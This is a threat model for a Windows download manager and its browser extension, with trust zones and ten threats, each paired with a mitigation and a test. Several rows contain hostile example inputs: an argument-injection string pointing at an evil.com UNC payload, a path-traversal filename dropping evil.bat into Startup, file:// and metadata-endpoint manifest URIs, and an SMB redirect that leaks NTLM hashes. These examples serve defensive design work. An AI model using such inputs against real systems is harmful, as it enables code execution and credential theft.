## 1. Trust Boundaries

1. **Untrusted Zone (Adversary-Controlled):**
   - Arbitrary webpages, embedded iframes, malicious JavaScript in `MAIN` world, malicious HTTP/HTTPS servers, HTTP redirect chains, `Content-Disposition` headers, and hostile `.m3u8` / `.mpd` manifests.
2. **Semi-Trusted Zone (Browser Extension Sandbox):**
   - Isolated content scripts (`ISOLATED` world) and the extension Service Worker. Assumed to process untrusted inputs from any website the user visits.
3. **Privileged Local User Zone (`openidm-nmh.exe`, `openidm.exe`, `N_m3u8DL-RE.exe`, `ffmpeg.exe`):**
   - Runs with the Windows user's local filesystem and network privileges (`Medium Integrity Level`). Must treat **all** inputs arriving over Native Messaging IPC or HTTP responses as untrusted.

## 2. Comprehensive Threat Catalog & Mitigations

| Threat ID | Threat Category | Attack Path | Impact | Mandatory Security Requirement & Mitigation | Verification Test Case |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **THREAT-001** | **Local Service Exposure / Cross-Origin CSRF** | A malicious webpage sends `fetch("http://127.0.0.1:3020/...")` or uses DNS rebinding to silently queue a malicious `.exe`/`.bat` download into the user's Startup folder (a flaw affecting download managers that run unauthenticated localhost servers like upstream Brisk). | **Critical** (Remote Code Execution / Drive-by Download) | **Mitigation (`NFR-007`, `ADR-0003`):** Do not run a localhost HTTP server. Use Browser Native Messaging (`stdio`) -> ACL-protected Windows Named Pipe (`\\\\.\\pipe\\OpenIDM_IPC_<UserSID>`). Webpages cannot invoke `chrome.runtime.connectNative`. Furthermore, every download requires explicit user confirmation in the Win32 "Add Download" dialog unless the user explicitly initiates it via the extension UI. | `SEC-NET-01`: Verify via `GetExtendedTcpTable` that `openidm.exe` binds zero TCP ports in default operation. |
| **THREAT-002** | **Command / Argument Injection into Worker Subprocesses** | A hostile webpage crafts a video `<title>`, URL, or `Referer` containing quotes or flags (e.g., `video" --decryption-binary-path "\\\\evil.com\\share\\payload.exe`) to execute arbitrary binaries via `N_m3u8DL-RE.exe` (a risk present in upstream Cat Catch's `m3u8dl://` URL protocol templates). | **Critical** (Remote Code Execution) | **Mitigation (`FR-021`):** Never use URL protocols (`m3u8dl://`). Never pass user/webpage strings via shell interpolation (`cmd.exe /c`). `Nm3u8dlReAdapter` writes allowlisted options into an ACL-restricted `@job.rsp` file where the URL is verified to start with `http://` or `https://` (never `-` or `@`), `--save-name` is restricted to `[A-Za-z0-9._ -]+`, and `--ffmpeg-binary-path` / `--decryption-binary-path` are hardcoded by `openidm.exe` to verified application paths. | `SEC-PROC-01`: Pass 25 adversarial URLs, titles, and headers containing `"`, `@`, `\n`, `--ffmpeg-binary-path`, and UNC paths (`\\\\`); verify zero flag injection in `job.rsp`. |
| **THREAT-003** | **Path Traversal & NTFS Alternate Data Stream (ADS) Injection** | A malicious server returns `Content-Disposition: attachment; filename="../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/evil.bat"` or `filename="video.mp4:zone.identifier"` or reserved DOS device names (`CON`, `NUL`, `COM1`). | **Critical** (Arbitrary File Write / RCE) | **Mitigation (`NFR-006`):** `PathSanitizer::SanitizeFileName` strips all directory components (`/` and `\\`), replaces `:`, `*`, `?`, `"`, `<`, `>`, `|` and `0x00–0x1F` with `_`, rejects/prefixes DOS device names (`CON`, `PRN`, `AUX`, `NUL`, `COM1–9`, `LPT1–9`), trims trailing dots and spaces, truncates UTF-8 base names at 200 bytes, and verifies via `GetFullPathNameW` that the resolved target file's parent directory exactly matches the chosen save directory. | `SEC-PATH-01`: Unit fuzz test covering `..`, UNC paths, NTFS ADS (`:`), null bytes, RTL override (`U+202E`), and DOS device names. |
| **THREAT-004** | **Hostile Media Manifests (SSRF & Local File Inclusion in HLS/DASH)** | A malicious `.m3u8` or `.mpd` manifest contains `file:///C:/Windows/win.ini`, `http://169.254.169.254/...`, `http://127.0.0.1:8080/admin`, or `#EXT-X-KEY:METHOD=AES-128,URI="file:///..."` to exfiltrate or probe local resources during segment downloading. | **High** (Local SSRF / File Probing) | **Mitigation:** 1. When caching manifest bodies or inspecting `meta.json` after Phase 1 probe, verify all segment and key URIs use `http://` or `https://` schemes and reject `file://`, `udp://`, `rtmp://`, or loopback/link-local IPs (`127.0.0.0/8`, `::1`, `169.254.0.0/16`) unless explicitly running in developer loopback test mode.<br>2. Always pass `--ffmpeg-concat-mode LOCAL_HTTP` or controlled segment lists so FFmpeg never parses untrusted remote M3U8 playlists directly with `-protocol_whitelist file,http,crypto`. | `SEC-MANIFEST-01`: Feed hostile `.m3u8` containing `file://` and `http://127.0.0.1` segment URIs; verify rejection before Phase 2 download. |
| **THREAT-005** | **Malicious Redirects to Local Network or Unsafe Schemes** | An initial `https://public.example/file.zip` redirects (`301`/`302`) to `file:///C:/...` or `http://192.168.1.1/reset` or an SMB UNC path (`\\\\evil\\share` triggering NTLM hash leak). | **High** (SSRF / NTLM Hash Leak) | **Mitigation:** `WinHTTP` automatically restricts schemes to `HTTP`/`HTTPS` (never `file://` or `smb://`). In addition, `WinHttpDownloadEngine` hooks `WINHTTP_CALLBACK_STATUS_REDIRECT`, inspects the target URL host, blocks redirects from public IPs to loopback/RFC1918 private/link-local addresses, and disables automatic Windows NTLM/Kerberos logon (`WINHTTP_AUTOLOGON_SECURITY_LEVEL_HIGH` — never send Windows domain credentials to internet hosts!). | `SEC-NET-02`: Test server redirects `https://` request to `http://127.0.0.1` and `file://`; verify immediate abort with `ERR_NET_UNSAFE_REDIRECT`. |
| **THREAT-006** | **Local Process Abuse & Named Pipe Squatting** | Another low-privileged user account on a shared Windows terminal server creates `\\\\.\\pipe\\OpenIDM_IPC` first to intercept cookies from the browser extension, or connects to the user's pipe to inject tasks. | **High** (Privilege Escalation / Credential Theft) | **Mitigation (`NFR-008`):** Include the user's SID in the pipe name (`\\\\.\\pipe\\OpenIDM_IPC_<UserSID>`), specify `FILE_FLAG_FIRST_PIPE_INSTANCE`, apply a strict DACL granting access only to `<UserSID>` and `SYSTEM`, and verify client executable path via `GetNamedPipeClientProcessId`. | `SEC-IPC-01`: Attempt to open the Named Pipe from a different Windows user token or with `FILE_FLAG_FIRST_PIPE_INSTANCE` collision; verify `ERROR_ACCESS_DENIED`. |
| **THREAT-007** | **Forged Webpage Messages to Content Script / Extension Compromise** | A webpage dispatches synthetic `window.postMessage` or DOM events pretending to be the Layer 3 Deep Search hook to spoof media URLs or flood the extension with thousands of fake candidates. | **Medium** (UI Spoofing / DoS) | **Mitigation:** 1. Layer 3 (`DeepSearchHook.ts`) is disabled by default.<br>2. When enabled on a tab, the isolated content script generates a per-injection random 128-bit cryptographic nonce (`crypto.randomUUID()`) passed into the closure at injection time and accepts only `CustomEvent` payloads carrying that exact nonce.<br>3. Rate-limit candidate registration to `max 50 candidates per tab`. | `SEC-EXT-01`: Webpage script dispatches forged `CustomEvent` without valid closure nonce; verify event is ignored. |
| **THREAT-008** | **Cookie & Token Leakage in Process Arguments, Disk, or Logs** | Session cookies (`Cookie`), bearer tokens (`Authorization`), or signed URL tokens leak via process command lines, unencrypted SQLite columns, or crash logs. | **High** (Account Takeover / Session Hijacking) | **Mitigation (`NFR-009`):** 1. Encrypt transient auth headers in `state.db` using Windows DPAPI (`CryptProtectData`).<br>2. Pass worker headers via ACL-restricted `@job.rsp` files and wipe on completion.<br>3. Redact all sensitive headers and token query params in `Logger`. | `SEC-PRIV-01`: Inspect `state.db` hex dump, `openidm.log`, and `Win32_Process.CommandLine` during an authenticated download; verify zero plaintext cookie values. |
| **THREAT-009** | **DLL Side-Loading / Unquoted Path Hijacking in Installer or App** | An attacker places a malicious `version.dll` or `winhttp.dll` in the user's `Downloads` folder or exploits an unquoted path in registry keys. | **High** (Local Code Execution) | **Mitigation:** 1. Call `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32 | LOAD_LIBRARY_SEARCH_APPLICATION_DIR)` at the very start of `wWinMain` in both `openidm.exe` and `openidm-nmh.exe`.<br>2. Never set the current working directory (`SetCurrentDirectoryW`) to the user's `Downloads` folder.<br>3. Quote all executable paths in `CreateProcessW` and registry entries. | `SEC-BIN-01`: Place canary `winhttp.dll` in `Downloads` folder and run `openidm.exe`; verify canary DLL is never loaded (`Process Monitor` / module list check). |
| **THREAT-010** | **Dependency Compromise & Update Tampering** | A compromised npm package, malicious third-party binary update, or MITM on update check replaces `openidm.exe` or `N_m3u8DL-RE.exe`. | **Critical** (Supply Chain Compromise) | **Mitigation:** 1. Zero runtime npm dependencies in `extension/`.<br>2. Pin exact SHA-256 hashes of `N_m3u8DL-RE.exe`, `ffmpeg.exe`, and `vcpkg` ports.<br>3. Verify update manifests with an offline-held **Ed25519** key and verify installer **Authenticode** signatures before execution (`FR-028`). | `SEC-UPD-01`: Tamper 1 byte in update installer or manifest signature; verify updater aborts and deletes file. |
